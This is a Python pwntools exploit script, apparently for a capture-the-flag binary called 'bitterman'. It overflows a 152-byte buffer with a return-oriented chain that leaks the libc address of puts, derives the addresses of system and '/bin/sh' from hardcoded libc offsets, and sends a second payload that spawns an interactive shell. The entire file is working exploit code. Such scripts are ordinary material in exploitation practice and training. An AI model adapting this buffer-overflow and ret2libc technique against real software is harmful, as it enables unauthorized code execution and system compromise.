from pwn import *

#context(terminal=['tmux', 'splitw', '-h'])
#context.log_level = "DEBUG"
context(os='linux', arch='amd64')

p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')

#STAGE 1 --> LEAKING PUTS ADDRESS

offset = 152
junk = b"A"*offset
pop_rdi = p64(0x400853)
plt_put = p64(0x400520)
got_put = p64(0x600c50)
plt_main = p64(0x4006ec)

payload = [junk, pop_rdi, got_put, plt_put, plt_main]

payload = b"".join(payload)

p.recvuntil("name?")
p.sendline("jeje")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.recv()[:8].strip().ljust(8, b'\x00')
log.success(f"LEAKED PUTS ADDRESS: {leaked_puts}")
leaked_puts = u64(leaked_puts)

#STAGE 2 --> REVERSE SHELL system("/bin/sh")

pop_rdi = p64(0x400853)
libc_puts = 0x76590
libc_system = 0x48df0
libc_sh = 0x18a156

offset = leaked_puts - libc_puts
sys = p64(offset + libc_system)
bin_sh = p64(offset + libc_sh)

payload = junk + pop_rdi + bin_sh + sys

p.sendline("jeje")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)


p.interactive()
